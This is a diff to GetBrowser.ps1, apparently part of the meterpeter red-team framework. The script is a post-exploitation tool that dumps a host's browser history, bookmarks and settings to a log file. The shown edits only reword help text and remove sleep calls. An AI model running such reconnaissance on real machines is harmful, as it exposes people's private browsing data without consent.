@@ -26,7 +26,7 @@
 
 .EXAMPLE
    PS C:\> .\GetBrowser.ps1 -CHROME $env:USERPROFILE\Desktop
-   Enumerates Chrome Browser Info and writes logfile to $env:USERPROFILE\Desktop\BrowserEnum.log
+   Enumerates Chrome Browser Info and writes the logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
 
 .NOTES
    :meterpeter> upload
@@ -41,7 +41,6 @@
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1
 #>
 
-
 $IPATH = pwd
 $ParsingData = $null
 $param1 = $args[0] # User Inputs [Arguments]
@@ -51,12 +50,12 @@ If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2"}
 If(-not($param1)){
    ## Required (Mandatory) Parameters Settings
    echo "`nGetBrowser - Dump Local-Host Browsers Information." > $LogFilePath\BrowserEnum.log
-   echo "[ ERROR ] This Script Requires Parameters (Args) to Run .." >> $LogFilePath\BrowserEnum.log
+   echo "[ ERROR ] This Script Requires Parameters (-args) to Run .." >> $LogFilePath\BrowserEnum.log
    echo "`n[Example] ./GetBrowser.ps1 -IE" >> $LogFilePath\BrowserEnum.log
    echo "[Example] ./GetBrowser.ps1 -ALL" >> $LogFilePath\BrowserEnum.log
    echo "[Example] ./GetBrowser.ps1 -HELP" >> $LogFilePath\BrowserEnum.log
    echo "[Example] ./GetBrowser.ps1 -CHROME" >> $LogFilePath\BrowserEnum.log
-   echo "[Example] ./GetBrowser.ps1 -FIREFOX" >> $LogFilePath\BrowserEnum.log
+   echo "[Example] ./GetBrowser.ps1 -FIREFOX`n" >> $LogFilePath\BrowserEnum.log
    Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
    Start-Sleep -Seconds 6;exit
 }
@@ -90,7 +89,7 @@ function HELP_MENU {
   If($param1 -eq "-help" -or $param1 -eq "-HELP"){
     write-host "`n"
     write-host ".Author r00t-3xp10it {SSA RedTeam @2020}" -ForegroundColor Green
-    write-host "  Required Dependencies: Local Web Browser"
+    write-host "  Required Dependencies: IE, Firefox, Chrome"
     write-host "  Optional Dependencies: None"
     write-host "  PS Script Dev Version: v1.8"
     write-host "`n"
@@ -98,7 +97,7 @@ function HELP_MENU {
     write-host "  Standalone Powershell script to dump Local-host browser information sutch as:"
     write-host "  HomePage, Browser Version, Contry Code, Download Dir, URL History, Bookmarks,"
     write-host "  etc.. The dumps will be Saved into `$env:TMP Folder for later review. Unless"
-    write-host "  this script 2º argument its used to input another LogFile storage location"
+    write-host "  this script 2º argument its used to input another LogFile storage location."
     write-host "`n"
     write-host ".EXAMPLE" -ForegroundColor Green
     write-host "  PS C:\> ./GetBrowser.ps1 -ALL"
@@ -110,7 +109,7 @@ function HELP_MENU {
     write-host "`n"
     write-host ".EXAMPLE" -ForegroundColor Green
     write-host "  PS C:\> .\GetBrowser.ps1 -CHROME `$env:USERPROFILE\Desktop"
-    write-host "  Enumerates Chrome Browser Info and writes logfile to `$env:USERPROFILE\Desktop\BrowserEnum.log"
+    write-host "  Enumerates Chrome Browser Info and writes the logfile to: `$env:USERPROFILE\Desktop\BrowserEnum.log"
     write-host "`n"
     write-host ".NOTES" -ForegroundColor Green
     write-host "  :meterpeter> upload"
@@ -124,7 +123,6 @@ function HELP_MENU {
     write-host "  https://github.com/r00t-3xp10it/meterpeter"
     write-host "  https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1"
     write-host "`n"
-    Start-Sleep -Seconds 3
     exit
   }
 }
@@ -364,5 +362,4 @@ If($param1 -eq "-ALL"){IE_Dump;FIREFOX;CHROME}
 ## Retrieve Remote Info from LogFile
 Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n`n";
 Write-Host "[i] DumpLogFile: $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow -BackGroundColor Black
-Start-sleep -Seconds 4
 exit
